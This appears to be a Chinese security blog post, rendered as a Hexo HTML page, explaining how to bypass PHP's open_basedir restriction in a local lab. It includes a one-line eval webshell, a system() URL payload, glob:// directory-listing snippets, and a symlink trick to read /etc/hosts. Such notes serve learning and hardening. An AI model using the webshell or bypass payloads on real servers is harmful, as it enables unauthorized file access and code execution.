@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="怎么设置open_basedir?在php.ini中搜索open_basedir 12.代表当前目录，多个目录用:隔开open_basedir&#x3D;&#x2F;var&#x2F;www&#x2F;html    本地测试环境：linux+apache写一个最简单的一句话木马作为测试脚本： 1234&lt;?php ini_set(&amp;#x27;open_basedir&amp;#x27;,&amp;#x27;&#x2F;var&#x2F;www&#x2F;html&#x2F;&amp;#x27;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php绕过open_basedir">
+<meta property="og:url" content="http://example.com/2024/05/26/php%E7%BB%95%E8%BF%87open-basedir/index.html">
+<meta property="og:site_name" content="K1ato&#39;s blog">
+<meta property="og:description" content="怎么设置open_basedir?在php.ini中搜索open_basedir 12.代表当前目录，多个目录用:隔开open_basedir&#x3D;&#x2F;var&#x2F;www&#x2F;html    本地测试环境：linux+apache写一个最简单的一句话木马作为测试脚本： 1234&lt;?php ini_set(&amp;#x27;open_basedir&amp;#x27;,&amp;#x27;&#x2F;var&#x2F;www&#x2F;html&#x2F;&amp;#x27;">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-05-26T06:00:44.000Z">
+<meta property="article:modified_time" content="2024-08-10T10:49:45.952Z">
+<meta property="article:author" content="k1ato">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>php绕过open_basedir</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/06/13/JAVA%E9%83%A8%E5%88%86/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/05/26/pear%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(%E6%9C%AA%E5%AE%8C)/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/05/26/php%E7%BB%95%E8%BF%87open-basedir/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/05/26/php%E7%BB%95%E8%BF%87open-basedir/&text=php绕过open_basedir"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/05/26/php%E7%BB%95%E8%BF%87open-basedir/&title=php绕过open_basedir"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/05/26/php%E7%BB%95%E8%BF%87open-basedir/&is_video=false&description=php绕过open_basedir"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=php绕过open_basedir&body=Check out this article: http://example.com/2024/05/26/php%E7%BB%95%E8%BF%87open-basedir/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/05/26/php%E7%BB%95%E8%BF%87open-basedir/&title=php绕过open_basedir"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/05/26/php%E7%BB%95%E8%BF%87open-basedir/&title=php绕过open_basedir"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/05/26/php%E7%BB%95%E8%BF%87open-basedir/&title=php绕过open_basedir"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/05/26/php%E7%BB%95%E8%BF%87open-basedir/&title=php绕过open_basedir"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/05/26/php%E7%BB%95%E8%BF%87open-basedir/&name=php绕过open_basedir&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/05/26/php%E7%BB%95%E8%BF%87open-basedir/&t=php绕过open_basedir"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%8E%E4%B9%88%E8%AE%BE%E7%BD%AEopen-basedir"><span class="toc-number">1.</span> <span class="toc-text">怎么设置open_basedir?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%EF%BC%9Alinux-apache"><span class="toc-number">2.</span> <span class="toc-text">本地测试环境：linux+apache</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">绕过方法：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x1-%E5%88%A9%E7%94%A8%E7%B3%BB%E7%BB%9F%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="toc-number">3.1.</span> <span class="toc-text">0x1.利用系统函数绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x2-%E5%88%A9%E7%94%A8glob%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87%EF%BC%88%E7%BC%BA%E9%99%B7%EF%BC%9A%E5%8F%AA%E8%83%BD%E5%88%97%E4%B8%BE%E6%A0%B9%E7%9B%AE%E5%BD%95%E5%92%8Copen-basedir%E5%85%81%E8%AE%B8%E7%9A%84%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%9A%84%E5%86%85%E5%AE%B9%EF%BC%89"><span class="toc-number">3.2.</span> <span class="toc-text">0x2.利用glob协议绕过（缺陷：只能列举根目录和open_basedir允许的目录下的内容）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x3-%E5%88%A9%E7%94%A8symlink%E7%BB%95%E8%BF%87"><span class="toc-number">3.3.</span> <span class="toc-text">0x3.利用symlink绕过</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%98%E6%9C%89%E5%BE%88%E5%A4%9A%E7%A7%8D%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E3%80%82"><span class="toc-number">4.</span> <span class="toc-text">还有很多种绕过方法。</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        php绕过open_basedir
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">k1ato</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-05-26T06:00:44.000Z" class="dt-published" itemprop="datePublished">2024-05-26</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h3 id="怎么设置open-basedir"><a href="#怎么设置open-basedir" class="headerlink" title="怎么设置open_basedir?"></a>怎么设置open_basedir?</h3><p>在php.ini中搜索open_basedir</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.代表当前目录，多个目录用:隔开</span><br><span class="line">open_basedir=/var/www/html</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="本地测试环境：linux-apache"><a href="#本地测试环境：linux-apache" class="headerlink" title="本地测试环境：linux+apache"></a>本地测试环境：linux+apache</h3><p>写一个最简单的一句话木马作为测试脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&#x27;open_basedir&#x27;,&#x27;/var/www/html/&#x27;);</span><br><span class="line">eval($_GET[&#x27;shell&#x27;]);?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>当前目录为&#x2F;var&#x2F;www&#x2F;html，在&#x2F;var&#x2F;html目录下有一个文件1.txt，目标就是读取这个1.txt的内容。</p>
+<h3 id="绕过方法："><a href="#绕过方法：" class="headerlink" title="绕过方法："></a>绕过方法：</h3><h4 id="0x1-利用系统函数绕过"><a href="#0x1-利用系统函数绕过" class="headerlink" title="0x1.利用系统函数绕过"></a>0x1.利用系统函数绕过</h4><p>这种方法一般不太实用，因为disable_functions里一般会禁用系统函数。</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.225.149/openbasedir.php?shell=system(&#x27;cat ../1.txt&#x27;);</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="0x2-利用glob协议绕过（缺陷：只能列举根目录和open-basedir允许的目录下的内容）"><a href="#0x2-利用glob协议绕过（缺陷：只能列举根目录和open-basedir允许的目录下的内容）" class="headerlink" title="0x2.利用glob协议绕过（缺陷：只能列举根目录和open_basedir允许的目录下的内容）"></a>0x2.利用glob协议绕过（缺陷：只能列举根目录和open_basedir允许的目录下的内容）</h4><p>1.利用 DirectoryIterator+glob:&#x2F;&#x2F;</p>
+<p>在未开启open_basedir时，利用glob协议可以列举任意目录下的文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$a=new DirectoryIterator(&quot;glob:///var/www/*&quot;);</span><br><span class="line">foreach($a as $f)&#123;</span><br><span class="line">echo($f-&gt;__toString().&#x27; &#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>开启了open_basedir后，glob协议就只能列举根目录和open_basedir指定的目录下的文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$a=new DirectoryIterator(&quot;glob:///*&quot;);     //列举根目录下文件</span><br><span class="line">foreach($a as $f)&#123;</span><br><span class="line">echo($f-&gt;__toString().&#x27; &#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=new DirectoryIterator(&quot;glob://*&quot;);     //列举当前目录下文件</span><br><span class="line">foreach($a as $f)&#123;</span><br><span class="line">echo($f-&gt;__toString().&#x27; &#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>2.利用scandir()+glob:&#x2F;&#x2F;</p>
+<p>同上文所述，开启了open_basedir后，glob协议就只能列举根目录和open_basedir指定的目录下的文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">根目录：</span><br><span class="line">print_r(scandir(&#x27;glob:///*&#x27;));</span><br><span class="line">当前目录：</span><br><span class="line">print_r(scandir(&#x27;glob://*&#x27;));</span><br></pre></td></tr></table></figure>
+
+
+
+<p>3.利用 opendir()+readdir()+glob:&#x2F;&#x2F;</p>
+<p><code>opendir</code>作用为打开目录句柄</p>
+<p><code>readdir</code>作用为从目录句柄中读取目录</p>
+<p>同样也是，开启了open_basedir后，glob协议就只能列举根目录和open_basedir指定的目录下的文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if ( $b = opendir(&#x27;glob:///*&#x27;) ) &#123;</span><br><span class="line">    while ( ($file = readdir($b)) !== false ) &#123;</span><br><span class="line">        echo $file.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    closedir($b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="0x3-利用symlink绕过"><a href="#0x3-利用symlink绕过" class="headerlink" title="0x3.利用symlink绕过"></a>0x3.利用symlink绕过</h4><p>当前路径是&#x2F;var&#x2F;www&#x2F;html，新建目录数量&#x3D;需要上跳次数+1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mkdir(&quot;1&quot;);chdir(&quot;1&quot;);</span><br><span class="line">mkdir(&quot;2&quot;);chdir(&quot;2&quot;);</span><br><span class="line">mkdir(&quot;3&quot;);chdir(&quot;3&quot;);</span><br><span class="line">mkdir(&quot;4&quot;);chdir(&quot;4&quot;);  </span><br><span class="line">chdir(&quot;..&quot;);chdir(&quot;..&quot;);chdir(&quot;..&quot;);chdir(&quot;..&quot;);</span><br><span class="line">symlink(&quot;1/2/3/4&quot;,&quot;tmplink&quot;);</span><br><span class="line">symlink(&quot;tmplink/../../../../etc/hosts&quot;,&quot;bypass&quot;);</span><br><span class="line">unlink(&quot;tmplink&quot;);</span><br><span class="line">mkdir(&quot;tmplink&quot;); //tmplink变成了一个真实的目录，bypass这个软连接中的tmplink也变成了一个真实的目录</span><br><span class="line">echo file_get_contents(&quot;bypass&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>本地打不出来，用户是www-data，在mkdir()时权限不够。</p>
+<h3 id="还有很多种绕过方法。"><a href="#还有很多种绕过方法。" class="headerlink" title="还有很多种绕过方法。"></a>还有很多种绕过方法。</h3>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%8E%E4%B9%88%E8%AE%BE%E7%BD%AEopen-basedir"><span class="toc-number">1.</span> <span class="toc-text">怎么设置open_basedir?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%EF%BC%9Alinux-apache"><span class="toc-number">2.</span> <span class="toc-text">本地测试环境：linux+apache</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">绕过方法：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x1-%E5%88%A9%E7%94%A8%E7%B3%BB%E7%BB%9F%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="toc-number">3.1.</span> <span class="toc-text">0x1.利用系统函数绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x2-%E5%88%A9%E7%94%A8glob%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87%EF%BC%88%E7%BC%BA%E9%99%B7%EF%BC%9A%E5%8F%AA%E8%83%BD%E5%88%97%E4%B8%BE%E6%A0%B9%E7%9B%AE%E5%BD%95%E5%92%8Copen-basedir%E5%85%81%E8%AE%B8%E7%9A%84%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%9A%84%E5%86%85%E5%AE%B9%EF%BC%89"><span class="toc-number">3.2.</span> <span class="toc-text">0x2.利用glob协议绕过（缺陷：只能列举根目录和open_basedir允许的目录下的内容）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x3-%E5%88%A9%E7%94%A8symlink%E7%BB%95%E8%BF%87"><span class="toc-number">3.3.</span> <span class="toc-text">0x3.利用symlink绕过</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%98%E6%9C%89%E5%BE%88%E5%A4%9A%E7%A7%8D%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E3%80%82"><span class="toc-number">4.</span> <span class="toc-text">还有很多种绕过方法。</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/05/26/php%E7%BB%95%E8%BF%87open-basedir/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/05/26/php%E7%BB%95%E8%BF%87open-basedir/&text=php绕过open_basedir"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/05/26/php%E7%BB%95%E8%BF%87open-basedir/&title=php绕过open_basedir"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/05/26/php%E7%BB%95%E8%BF%87open-basedir/&is_video=false&description=php绕过open_basedir"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=php绕过open_basedir&body=Check out this article: http://example.com/2024/05/26/php%E7%BB%95%E8%BF%87open-basedir/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/05/26/php%E7%BB%95%E8%BF%87open-basedir/&title=php绕过open_basedir"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/05/26/php%E7%BB%95%E8%BF%87open-basedir/&title=php绕过open_basedir"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/05/26/php%E7%BB%95%E8%BF%87open-basedir/&title=php绕过open_basedir"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/05/26/php%E7%BB%95%E8%BF%87open-basedir/&title=php绕过open_basedir"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/05/26/php%E7%BB%95%E8%BF%87open-basedir/&name=php绕过open_basedir&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/05/26/php%E7%BB%95%E8%BF%87open-basedir/&t=php绕过open_basedir"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    k1ato
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
